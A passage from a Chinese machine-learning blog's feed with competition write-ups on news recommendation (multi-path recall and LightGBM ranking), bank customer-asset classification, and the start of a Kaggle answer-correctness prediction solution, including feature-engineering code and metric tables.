title="数据表"></a>数据表</h2><p>train_click_log.csv：训练集用户点击日志<br>testA_click_log.csv：测试集用户点击日志<br>articles.csv：新闻文章信息数据表<br>articles_emb.csv：新闻文章embedding向量表示<br>sample_submit.csv：提交样例文件  </p><details><summary>详细数据字段说明</summary><table><thead><tr><th align="center">Field</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">user_id</td><td align="center">用户id</td></tr><tr><td align="center">click_article_id</td><td align="center">点击文章id</td></tr><tr><td align="center">click_timestamp</td><td align="center">点击时间戳</td></tr><tr><td align="center">click_environment</td><td align="center">点击环境</td></tr><tr><td align="center">click_deviceGroup</td><td align="center">点击设备组</td></tr><tr><td align="center">click_os</td><td align="center">点击操作系统</td></tr><tr><td align="center">click_country</td><td align="center">点击城市</td></tr><tr><td align="center">click_region</td><td align="center">点击地区</td></tr><tr><td align="center">click_referrer_type</td><td align="center">点击来源类型</td></tr><tr><td align="center">article_id</td><td align="center">文章id，与click_article_id相对应</td></tr><tr><td align="center">category_id</td><td align="center">文章类型id</td></tr><tr><td align="center">created_at_ts</td><td align="center">文章创建时间戳</td></tr><tr><td align="center">words_count</td><td align="center">文章字数</td></tr><tr><td align="center">emb_1,emb_2,…,emb_249</td><td align="center">文章embedding向量表示</td></tr></tbody></table></details>  <h1 id="方案总结"><a href="#方案总结" class="headerlink" title="方案总结"></a>方案总结</h1><p>为了构造稳定的线下验证，从训练集用户中随机采样5w个用户作为作为线下验证集用户，将验证集用户的最后一次点击记录从原训练集的点击日志中剔除。合并这时候的训练集点击日志和测试集点击日志作为总的历史点击记录，预测验证集用户的最后一次点击作为线下验证，实验证明该验证方式很稳定，和线上指标同增同减且相差不大。</p><h1 id="召回"><a href="#召回" class="headerlink" title="召回"></a>召回</h1><p>本方案采用了3路召回，通过不同策略的差异性提高整体新闻的召回率。新闻推荐有强热点依赖，用户往往会短时间内点击许多相关新闻，所以需要从历史点击序列中挖掘新闻之间的关系信息。</p><h2 id="改进版-itemcf"><a href="#改进版-itemcf" class="headerlink" title="改进版 itemcf"></a>改进版 itemcf</h2><p>原始的 itemcf 将用户点击过的新闻看做一个无序的集合，但在实际应用中，应该考虑点击次序带来的影响。在计算同一序列中两个新闻的相似度时，不仅需要考虑共现次数，也需要考虑两个新闻之间的次序关系。同一点击序列中两个新闻位置越远，相关性应该减小。新闻对顺序和逆序的权重也不同，在点击序列A，B，C中，”BC”这样的正序权重应该大于”BA”这样的逆序权重。更多关于 itemcf 的改进可以看之前 KDD CUP 的相关方案总结。</p><blockquote><p>日志中所有出现过的新闻只有3w多个，而整个新闻库中却有30多万。用户可能会点击一些没有在日志数据中出现的新闻。从线下验证集来看，大概有12%待预测新闻没有出现在历史点击记录里。为了缓解冷启动问题，在计算新闻相似度的时候可以考虑加入内容相似度。但是基于数据集给的新闻 embedding 向量表示做向量召回的效果很差劲，所以最后在 itemcf 中没有引入新闻的内容相似度。</p></blockquote><p>建立新闻的相似度关系后，进入到召回阶段，根据用户的历史点击新闻，结合相似度选择 TOP100 关联新闻。选取关联新闻时，除了考虑和历史点击新闻的相似度，还要加入位置距离衰减。新闻点击是强热点相关，所以历史点击新闻对下一次点击预测的影响传播不会太远。在实际测试中，利用所有历史点击新闻做召回，hitrate_5 指标只有0.20，限定只用最近点击的两个新闻来做召回的话，可以大幅提升至0.33。</p><h2 id="基于网络关系的召回"><a href="#基于网络关系的召回" class="headerlink" title="基于网络关系的召回"></a>基于网络关系的召回</h2><p>该方法源自”Bipartite network projection and personal recommendation”，代码采用自<a href="https://tianchi.aliyun.com/forum/postDetail?postId=104936" target="_blank" rel="noopener">论坛开源</a>。该方法也分为两个阶段，新闻相似度计算和基于用户点击历史的新闻召回。在相似度计算阶段，通过用户将两个新闻连接起来。计算相似度时考虑两种因素：1)两个新闻的共同被点击用户过多，则相似度减少；2)共同被点击用户的点击新闻过多，相似度也要减少。基于用户点击历史的新闻召回和 itemcf 类似，不再赘述。类似地，在召回时只利用了最新一次点击的新闻做召回，相较于利用全量历史记录召回，效果提高了10%。</p><h2 id="w2v-向量召回"><a href="#w2v-向量召回" class="headerlink" title="w2v 向量召回"></a>w2v 向量召回</h2><p>除了使用人工规则从序列中提取相似度，我们还可以使用序列学习模型 Word2Vec 为新闻学习向量表示。将用户的新闻点击序列作为句子喂到 Word2Vec 模型，然后选取和用户最近点击新闻最相似的关联新闻。向量学习和寻找相似全部使用 gensim 库的 Word2Vec 实现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 模型训练</span><br><span class="line">model &#x3D; Word2Vec(sentences&#x3D;sentences, size&#x3D;256,  window&#x3D;3,  min_count&#x3D;1, sg&#x3D;1, hs&#x3D;0, seed&#x3D;seed, negative&#x3D;5, workers&#x3D;10, iter&#x3D;1)</span><br></pre></td></tr></table></figure><h2 id="召回合并"><a href="#召回合并" class="headerlink" title="召回合并"></a>召回合并</h2><p>多路召回之间肯定存在重复召回的情况，这也是为什么召回策略讲究差异性，其实就是为了减少重复召回的数量。利用重复召回的新闻数量占该路召回数量之比做相似度参考，3路召回的相似度见热力图。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://pic.logicjake.xyz/new1.png" alt="图1 召回方式相似度" title="">                </div>                <div class="image-caption">图1 召回方式相似度</div>            </figure><p>重复被召回的新闻在多个召回方式中的得分是不一样的，得分是排序时的强特，需要进行得分合并。对各个召回结果，以用户为单位进行最大最小归一化。分数合并测试了sum，mean和max，效果对比见下表。max丢失的消息较多，mean对重复次数多的新闻不公平。  </p><table><thead><tr><th align="center">合并方式</th><th align="center">hitrate_5</th></tr></thead><tbody><tr><td align="center">sum</td><td align="center">0.3700630930498286</td></tr><tr><td align="center">mean</td><td align="center">0.33700134134830345</td></tr><tr><td align="center">max</td><td align="center">0.35155745441899744</td></tr></tbody></table><p>去重之后，平均每个用户召回到153个新闻。删除没有召回到真实点击的验证集用户，减少了无用负样本的数量，也提高了后续排序模型的效果，但是在计算线下指标的时候这部分用户的数量要包括进去，否则指标会虚高。合并前后各召回方式指标如下表所示：</p><table><thead><tr><th align="center"></th><th align="center">hitrate_5</th><th align="center">mrr_5</th></tr></thead><tbody><tr><td align="center">itemcf</td><td align="center">0.33628098762978786</td><td align="center">0.19792256611521228</td></tr><tr><td align="center">binetwork</td><td align="center">0.3127825525361419</td><td align="center">0.19114627320448885</td></tr><tr><td align="center">w2v</td><td align="center">0.15706195041979235</td><td align="center">0.08342813850663192</td></tr><tr><td align="center">合并</td><td align="center">0.3667842416414129</td><td align="center">0.2195861692085987</td></tr></tbody></table><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p>本方案把排序建模为二分类任务，分为特征工程和二分类模型预测两部分。特征工程主要围绕召回策略进行，保证实时性召回的新闻能在排序阶段被推出去。模型采用 LGB 模型。</p><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><p>特征工程分为3类：新闻特征，用户特征，用户-新闻交互特征。数据集本身给出的属性信息较少，所以特征工程主要围绕交互属性展开。</p><p>新闻特征包括：</p><ul><li>新闻字数</li><li>新闻创建时间</li><li>新闻被阅读数量</li></ul><p>用户特征包括：</p><ul><li>用户点击新闻的创建时间差的平均值</li><li>用户点击新闻的点击时间差的平均值</li><li>用户点击新闻的点击-创建时间差的统计值：mean，std</li><li>用户点击新闻的 click_datetime_hour 统计值</li><li>用户点击新闻的字数统计值</li><li>用户点击新闻的创建时间统计值</li><li>用户点击新闻的点击时间统计值</li><li>用户新闻阅读数量</li><li>用户某种类新闻阅读数量</li></ul><p>交互特征主要基于之前的召回策略进行，通过保存召回阶段的新闻相似度信息或向量，我们能够间接或直接得到用户对待预测新闻的评分。基于 itemcf， 网络关系和 w2v 的召回得到的只是新闻之间的相似度，需要和用户的历史点击新闻计算间接得到用户-新闻评分，采用如下方式：</p><ul><li>待预测新闻和用户所有历史点击新闻相似度按次序加权求和</li><li>待预测新闻和用户最近一次点击新闻相似度</li></ul><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>模型采用单模 LGB 进行预测，特征重要性见下表。排序之后，hitrate_5 涨到0.4394406080778976，mrr_5 涨到0.26552279464123835。</p><table><thead><tr><th align="center">feature_name</th><th align="center">gain</th></tr></thead><tbody><tr><td align="center">sim_score</td><td align="center">557646.594097</td></tr><tr><td align="center">user_last_click_timestamp_diff</td><td align="center">192108.389757</td></tr><tr><td align="center">user_last_click_article_itemcf_sim</td><td align="center">124281.856153</td></tr><tr><td align="center">user_last_click_article_w2v_sim</td><td align="center">73809.001815</td></tr><tr><td align="center">user_clicked_article_itemcf_sim_sum</td><td align="center">65907.806015</td></tr><tr><td align="center">article_id_cnt</td><td align="center">65031.067219</td></tr><tr><td align="center">user_last_click_created_at_ts_diff</td><td align="center">53308.117885</td></tr><tr><td align="center">user_last_click_article_binetwork_sim</td><td align="center">35544.272514</td></tr><tr><td align="center">user_click_article_w2w_sim_sum_2</td><td align="center">22115.916349</td></tr><tr><td align="center">user_click_timestamp_created_at_ts_diff_mean</td><td align="center">20967.278802</td></tr><tr><td align="center">user_click_timestamp_created_at_ts_diff_std</td><td align="center">19246.184266</td></tr><tr><td align="center">article_id</td><td align="center">19177.854082</td></tr><tr><td align="center">words_count</td><td align="center">18412.732866</td></tr><tr><td align="center">user_click_last_article_click_time</td><td align="center">17445.728666</td></tr><tr><td align="center">user_click_datetime_hour_std</td><td align="center">17065.241513</td></tr><tr><td align="center">user_id_category_id_cnt</td><td align="center">16947.363850</td></tr><tr><td align="center">created_at_ts</td><td align="center">16833.830176</td></tr><tr><td align="center">user_last_click_words_count_diff</td><td align="center">16622.374522</td></tr><tr><td align="center">user_clicked_article_words_count_mean</td><td align="center">16606.933470</td></tr><tr><td align="center">user_id_click_diff_mean</td><td align="center">15513.968470</td></tr><tr><td align="center">user_id_click_article_created_at_ts_diff_mean</td><td align="center">15014.800224</td></tr><tr><td align="center">user_id</td><td align="center">14344.929410</td></tr><tr><td align="center">user_click_last_article_words_count</td><td align="center">14080.826424</td></tr><tr><td align="center">user_clicked_article_click_time_mean</td><td align="center">13204.633566</td></tr><tr><td align="center">user_click_last_article_created_time</td><td align="center">10290.474666</td></tr><tr><td align="center">user_clicked_article_created_time_max</td><td align="center">9965.635575</td></tr><tr><td align="center">user_id_cnt</td><td align="center">8507.025577</td></tr><tr><td align="center">category_id</td><td align="center">6201.554409</td></tr></tbody></table>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/01/31/2020%E5%8E%A6%E9%97%A8%E5%9B%BD%E9%99%85%E9%93%B6%E8%A1%8C%E6%95%B0%E5%88%9B%E9%87%91%E8%9E%8D%E6%9D%AF%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[2020厦门国际银行数创金融杯建模大赛-赛后总结]]></title>
        <updated>2021-02-07T07:49:48+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/01/31/2020%E5%8E%A6%E9%97%A8%E5%9B%BD%E9%99%85%E9%93%B6%E8%A1%8C%E6%95%B0%E5%88%9B%E9%87%91%E8%9E%8D%E6%9D%AF%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2021/01/31/2020%E5%8E%A6%E9%97%A8%E5%9B%BD%E9%99%85%E9%93%B6%E8%A1%8C%E6%95%B0%E5%88%9B%E9%87%91%E8%9E%8D%E6%9D%AF%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：前15（靠方案从第18向前摸了个优胜奖） / 1478<br>比赛地址：<a href="https://js.dclab.run/v2/cmptDetail.html?id=439" target="_blank" rel="noopener">https://js.dclab.run/v2/cmptDetail.html?id=439</a><br>源码：<a href="https://github.com/LogicJake/2020-Xiamen-International-Bank-Financial-Cup" target="_blank" rel="noopener">https://github.com/LogicJake/2020-Xiamen-International-Bank-Financial-Cup</a>   </p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>在数字金融时代，大数据、人工智能技术在银行业内的发展日新月异，业内各机构都在加速数字化转型发展。厦门国际银行作为有特色的科技领先型中小银行，多年来始终坚持发挥数字金融科技力量，践行“数字赋能”理念，持续推进智慧风控、智慧营销、智慧运营、智慧管理，运用人工智能和大数据分析技术建立智能化客户服务模式和金融智慧营销服务体系，提升营销过程的智慧化、精准化水平，在为客户提供更贴心更具可用性的金融服务。</p><a id="more"></a><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><p>随着科技发展，银行陆续打造了线上线下、丰富多样的客户触点，来满足客户日常业务办理、渠道交易等客户需求。面对着大量的客户，银行需要更全面、准确地洞察客户需求。在实际业务开展过程中，需要发掘客户流失情况，对客户的资金变动情况预判；提前/及时针对客户进行营销，减少银行资金流失。本次竞赛提供实际业务场景中的客户行为和资产信息为建模对象，一方面希望能借此展现各参赛选手的数据挖掘实战能力，另一方面需要选手在复赛中结合建模的结果提出相应的营销解决方案，充分体现数据分析的价值。</p><h1 id="数据介绍"><a href="#数据介绍" class="headerlink" title="数据介绍"></a>数据介绍</h1><p>数据共分为三个部分，训练集(包括 2019 年第三、第四季度，每个季度的客户信息、资产数据、行为数据、重大历史数据、存款数据)、测试集(包括 2020 年第一季度的客户信息、资产数据、行为数据、重大历史数据、存款数据)，以及标签数据。建模的目标即根据训练集对模型进行训练，并对测试集进行预测。训练集和测试集中包含了有效客户和无效客户，而所给的标签中，只有有效用户的标签，同时赛题也要求只对有效用户建模，因此，本文以下的分析均为有效客户，不包含无效客户。  </p><p>本方案采用的方式是将将训练集(客户信息、资产数据、行为数据、重大历史数据、存款数据)按季度合并起来，合并之后的训练集有 82899 个有效客户，而测试集有 76722 个有效客户。  </p><details><summary>详细数据字段说明</summary><p>a) aum_m(Y) 代表第 Y 月的月末时点资产数据<br><img src="https://pic.logicjake.xyz/a.png" alt=""></p><p>b) behavior_m(Y) 代表第Y月的行为数据<br><img src="https://pic.logicjake.xyz/b.png" alt=""></p><p>c) big_event_Q(Z) 代表第 Z 季度的客户重大历史数据<br><img src="https://pic.logicjake.xyz/c.png" alt=""></p><p>d) cunkuan_m(Y) 代表第 Y 月的存款数据<br><img src="https://pic.logicjake.xyz/d.png" alt=""></p><p>e) cust_avli _Q(Z) 代表第 Z 季度的有效客户 仅有 cust_no  </p><p>f) cust_info_q(Z) 代表第 Z 季度的客户信息<br><img src="https://pic.logicjake.xyz/f.png" alt="">  </p></details>  <h1 id="方案总结"><a href="#方案总结" class="headerlink" title="方案总结"></a>方案总结</h1><p>根据工作人员的答疑，标签是根据一定业务规则和客户存款情况去给客户打标签, 反映的是客户资产的变化情况。</p><ul><li>-1 代表客户资产下降</li><li>0 代表客户资产维稳</li><li>1 代表客户资产上升  </li></ul><p>训练集中 63.9% 的客户属于类别 1 (资产上升)；20.8% 属于类别 2 (资产维稳)；15.3% 属于类别 -1 (资产下降)。</p><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><h3 id="行为数据相关特征"><a href="#行为数据相关特征" class="headerlink" title="行为数据相关特征"></a>行为数据相关特征</h3><p>在行为数据中有一列特征为最近一次交易时间B6，用当季度最后一天的日期减去B6可以得到客户没有交易的天数（用B6_gap表示），以此来衡量用户的沉寂时间。该特征在线下能提升4个k，但线上却起到了反作用。探查数据后发现，存在最近一次交易日期并不在该季度的日期范围之内的现象，也就是说很多客户在这一个季度内都没用交易过。这些用户的沉寂时间过长，因此在多个季度的数据中，最后一次交易时间都是同一个很久远的日期，所以需要进行截断，将最近一次交易日期截断在本季度所属日期范围内，防止同一个用户出现越后面的季度B6_gap越大的现象。重新处理后该特征<strong>线上能提升4个k</strong>。</p><p>对其他行为数据进行了交叉处理，构造了转入转出金额之差、之比，平均每次转入金额和平均每次转出金额。</p><p>行为数据是按月给出的，需要聚合为以季度为单位的特征。对原始的行为特征和衍生的交叉特征，对季度内的月数据进行mean，std，max，min，diff，last统计。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for f in tqdm([&#39;B1&#39;, &#39;B2&#39;, &#39;B3&#39;, &#39;B4&#39;, &#39;B5&#39;, &#39;B5_B3_minus&#39;, &#39;B3_B2_ratio&#39;, &#39;B5_B4_ratio&#39;, &#39;B5_B3_ratio&#39;]):</span><br><span class="line">    df_temp &#x3D; df_behavior.groupby([&#39;cust_no&#39;, &#39;q&#39;])[f].agg(&#123;</span><br><span class="line">        &#39;q_&#123;&#125;_mean&#39;.format(f): &#39;mean&#39;,</span><br><span class="line">        &#39;q_&#123;&#125;_std&#39;.format(f): &#39;std&#39;,</span><br><span class="line">        &#39;q_&#123;&#125;_max&#39;.format(f): &#39;max&#39;,</span><br><span class="line">        &#39;q_&#123;&#125;_min&#39;.format(f): &#39;min&#39;,</span><br><span class="line">        &#39;q_&#123;&#125;_diff&#39;.format(f): lambda x: x.values[-1] - x.values[0],</span><br><span class="line">        &#39;q_&#123;&#125;_last&#39;.format(f): &#39;last&#39;,</span><br><span class="line">    &#125;).reset_index()</span><br><span class="line">    df_feature &#x3D; df_feature.merge(df_temp, how&#x3D;&#39;left&#39;)</span><br></pre></td></tr></table></figure><h3 id="资产数据相关特征"><a href="#资产数据相关特征" class="headerlink" title="资产数据相关特征"></a>资产数据相关特征</h3><p>该表包含了月末客户的各类资产余额，很自然的可以求和得到所有资产的总和，顺便得到拥有的不同资产的类别。本季度最后一个月的月末数据可以视为本季度结束时的数据，各类资产余额除以总资产余额可以得到季度结束时各资产的配比。资产数据也是按月给出的，对资产的总和和资产类别数，进行mean，std，max，min，diff，last统计。</p><h3 id="存款数据相关特征"><a href="#存款数据相关特征" class="headerlink" title="存款数据相关特征"></a>存款数据相关特征</h3><p>不是很明白存款数据和资产数据的区别，该表给出了当月存款产品金额和存款产品个数，交叉得到平均每个存款产品的金额。按月对存款金额进行diff得到存款金额的月变化情况。同样对原始特征和衍生的交叉特征，对季度内的月数据进行mean，std，max，min，diff，last统计。</p><h3 id="历史事件数据相关特征"><a href="#历史事件数据相关特征" class="headerlink" title="历史事件数据相关特征"></a>历史事件数据相关特征</h3><p>该表有客户一系列的“第一次”的日期，虽然说时间特征一般是很强的，但实际并没有挖出强有力的代表特征，仅仅对这一系列日期特征交叉计算日期差。</p><h3 id="客户基本信息相关特征"><a href="#客户基本信息相关特征" class="headerlink" title="客户基本信息相关特征"></a>客户基本信息相关特征</h3><p>直接merge进主表就完事了，对类别特征做了count编码，探究的比较粗糙。</p><h3 id="季度间特征"><a href="#季度间特征" class="headerlink" title="季度间特征"></a>季度间特征</h3><p>上面的特征都是在季度内做统计，我们完全可以把每个季度最后一个月的数据视为季度数据，比如季度资产余额。这样我们就可以以季度为单位计算diff，得到各类资产余额距离上个季度的变化情况，从而得到客户的资产变动情况。该类特征提升较大，线上接近<strong>3个百</strong>。</p><h2 id="多分类预测概率权重搜索"><a href="#多分类预测概率权重搜索" class="headerlink" title="多分类预测概率权重搜索"></a>多分类预测概率权重搜索</h2><p>这也是多分类任务的一个很重要的提分trick，基本思想为暴力搜索各个类别的权重，使得预测类别的概率乘以权重后，kappa指标能提升。本质上是将模型预测的类别概率分布尽量拉到真实的标签分布，该trick线上能提升大概<strong>1.5个百</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def search_weight(valid_y, raw_prob, init_weight&#x3D;[1.0]*class_num, step&#x3D;0.001):</span><br><span class="line">    weight &#x3D; init_weight.copy()</span><br><span class="line">    f_best &#x3D; cohen_kappa_score(valid_y, raw_prob.argmax(</span><br><span class="line">        axis&#x3D;1))</span><br><span class="line">    flag_score &#x3D; 0</span><br><span class="line">    round_num &#x3D; 1</span><br><span class="line">    while(flag_score !&#x3D; f_best):</span><br><span class="line">        print(&#39;round: &#39;, round_num)</span><br><span class="line">        round_num +&#x3D; 1</span><br><span class="line">        flag_score &#x3D; f_best</span><br><span class="line">        for c in range(class_num):</span><br><span class="line">            for n_w in range(0, 2000, 10):</span><br><span class="line">                num &#x3D; n_w * step</span><br><span class="line">                new_weight &#x3D; weight.copy()</span><br><span class="line">                new_weight[c] &#x3D; num</span><br><span class="line"></span><br><span class="line">                prob_df &#x3D; raw_prob.copy()</span><br><span class="line">                prob_df &#x3D; prob_df * np.array(new_weight)</span><br><span class="line"></span><br><span class="line">                f &#x3D; cohen_kappa_score(valid_y, prob_df.argmax(</span><br><span class="line">                    axis&#x3D;1))</span><br><span class="line">                if f &gt; f_best:</span><br><span class="line">                    weight &#x3D; new_weight.copy()</span><br><span class="line">                    f_best &#x3D; f</span><br><span class="line">    return weight</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个比赛前期花费的时间比较多，后期随着挖特征收益太小，线上线下不一致，担心切榜就是摸奖，所以最后一个月基本就没提交了，就和队友融合了一下就放弃了。没想到b榜分数还是挺稳定的，而且前面有很多小号退赛，混进了前20，哈哈，无力吐槽。</p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/01/09/Riiid-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[Kaggle Riiid! Answer Correctness Prediction-赛后总结]]></title>
        <updated>2021-02-07T07:49:48+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/01/09/Riiid-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2021/01/09/Riiid-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：74 / 3395 银牌<br>比赛地址：<a href="https://www.kaggle.com/c/riiid-test-answer-prediction" target="_blank" rel="noopener">https://www.kaggle.com/c/riiid-test-answer-prediction</a></p><p>这比赛线上测评采用 API 方式逐步给出测试数据，模拟真实场景下的在线预测，所以基本避免了穿越特征的出现。此外由于在线测评的原因，要兼顾线上特征构造和模型预测的时间复杂度和空间复杂度，一个不满足都会导致线上提交失败。</p><p>赛题提供的数据量很大且是典型的序列数据，所以前排有许多基于 transformer 的 NN 方案，这一点是我们队伍的欠缺。本方案的线下验证集划分采用 tito 开源的 <a href="https://www.kaggle.com/its7171/cv-strategy" target="_blank" rel="noopener">CV Strategy</a>，特征构造框架也是采用 tito 大佬开源的 <a href="https://www.kaggle.com/its7171/lgbm-with-loop-feature-engineering" target="_blank" rel="noopener">LGBM with Loop Feature Engineering</a>，这里就不赘述了，直接进入特征工程部分。</p><h1 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h1><p>我们将构造的特征分为静态特征和动态特征，静态特征直接由训练集统计得到，不需要随着数据的增加逐步更新。赛题的线上测试集中是不包含新题目的，所以可以认为题目处于一种比较稳定的状态，不需要迭代更新。动态特征主要与用户相关，进来一条新数据，就需要更新与之相关的状态字典。</p><h2 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h2><ul><li>题目的 tags 提取出来的第一个标签 tag1</li><li>题目被回答次数，回答正确次数，正确率</li><li>题目所属 bundle_id 有多少题目</li><li>题目所属 bundle_id 的被回答次数，正确回答次数，正确率</li><li>题目所属 part 的被回答次数，正确回答次数，正确率</li><li>对 part 进行分桶，以 part=5 为分界划分是听力测试还是阅读测试</li><li>题目所属 tag1 所有题目的正确率的平均值和方差</li><li>对题目的 tags 做 embedding(dimension=2)，题目所有的 tag embedding 的平均值</li><li>题目出现次数，题目 part 出现次数，题目 tag1 出现次数在训练集中的占比</li><li>题目被多少个不同的人回答过</li></ul><h2 id="动态特征"><a href="#动态特征" class="headerlink" title="动态特征"></a>动态特征</h2><p>动态特征需要根据新数据不断更新，为了避免线上线下特征构造方式的差异性带来的潜在问题，我们在线下也使用了迭代式的特征构造方式。主要逻辑如下面的伪代码所示，核心在于3个函数，add_user_feats 用于线下数据的特征构造和状态字典更新，线上推理的时候，一批数据的真实标签需要在下批数据中给出，所以特征构造和状态字典更新需要在函数 add_user_feats_without_update 和函数 update_user_feats 分别进行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 线下特征构造</span><br><span class="line">特征状态字典 &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">def add_user_feats(df, 特征状态字典):</span><br><span class="line">    for ... in df.values:</span><br><span class="line">        根据 key 查询特征状态字典，构造本样本的特征</span><br><span class="line">        更新特征状态字典</span><br><span class="line"></span><br><span class="line">add_user_feats(训练集数据, 特征状态字典)</span><br><span class="line"></span><br><span class="line">保存特征状态字典</span><br><span class="line"></span><br><span class="line"># 线上特征构造</span><br><span class="line">加载线下保存的特征状态字典</span><br><span class="line"></span><br><span class="line">def update_user_feats(df, 特征状态字典):</span><br><span class="line">    for ... in df.values:</span><br><span class="line">        更新特征状态字典</span><br><span class="line"></span><br><span class="line">def add_user_feats_without_update(df, 特征状态字典):</span><br><span class="line">    for ... in df.values:</span><br><span class="line">        根据 key 查询特征状态字典，构造本样本的特征</span><br><span class="line"></span><br><span class="line">previous_test_df &#x3D; None</span><br><span class="line"></span><br><span class="line">for test_df in 线上测试集:</span><br><span class="line">    if previous_test_df is not None:</span><br><span class="line">        update_user_feats(previous_test_df, 特征状态字典)</span><br><span class="line"></span><br><span class="line">    previous_test_df &#x3D; test_df.copy()</span><br><span class="line">    add_user_feats_without_update(test_df, 特征状态字典)</span><br></pre></td></tr></table></figure><p>动态特征选取了不同的组合维度，包括用户，用户和题目 part 组合，用户和题目 tag1 组合，用户和题目组合。时间属性能够反应很多信息，构造时间差特征能有效反应学生的做题效率，做题热情等信息。下面斜体部分的特征都是围绕时间差展开构造的，总共大概有1.7个百分位的提升。</p><ul><li><p>用户侧特征</p><ul><li>用户答题次数，回答正确的次数，答题正确率</li><li><em>用户距离上次，上上次，上上上次答对题目的时间差</em></li><li><em>用户距离上次，上上次，上上上次，上上上上次答题的时间差和时间差之间的差值</em></li><li><em>用户距离上次，上上次听讲座的时间差</em></li><li><em>用户距离上次，上上次，上上次答错题目的时间差</em></li><li><em>用户距离上次，上上次学习（包括做题和听讲座）的时间差</em></li><li><strong>用户这次题目所属 container_id 和上个题目所属 container_id 的差值</strong></li><li>用户之前查看题目解答的次数</li><li>用户之前答题正确查看题目解答的次数</li><li>用户听力测试题目和阅读测试题目答题次数，回答正确的次数，答题正确率</li><li>用户听讲座的次数</li></ul></li><li><p>用户和题目 part 组合特征</p><ul><li>用户对同类型的题目回答次数，回答正确次数，正确率</li><li><em>用户距离上次同类型的题目回答正确和回答错误的时间差</em></li></ul></li><li><p>用户和题目 tag1 组合特征</p><ul><li>用户对同标签的题目回答次数，回答正确次数，正确率</li></ul></li><li><p>用户和题目组合</p><ul><li><strong>用户之前是否回答过这道题</strong></li><li><strong><em>用户距离上次回答该问题的时间差</em></strong></li></ul></li></ul><h3 id="关于-task-container-id-的强特"><a href="#关于-task-container-id-的强特" class="headerlink" title="关于 task_container_id 的强特"></a>关于 task_container_id 的强特</h3><p>Kaggle 上关于 task_container_id 的讨论不少，<a href="https://www.kaggle.com/c/riiid-test-answer-prediction/discussion/189465" target="_blank" rel="noopener">这则帖子</a>指出了 timestamp 和 task_container_id 不连续的问题，如图1所示。  </p><p><img src="https://pic.logicjake.xyz/kaggle_riiid_1.png" alt="图1">  </p><p>根据 Kaggle 工作人员在其他 discussion 里的答疑，timestamp 代表的是用户结束回答题目的时间。task_container_id 来源于这样一个场景：用户每次做题会得到一批题目，task_container_id 代表的是这批题目的编号，编号从0开始自增，所以 task_container_id 的大小反应了用户开始做题的顺序。如果用户都是做完一批题目再做下一批题目，那么 task_container_id 应该是随着 timestamp 依次增大的。图2代表的就是做完一批题目再做下一批题目的场景（方框中编号代表 task_container_id）。  </p><p><img 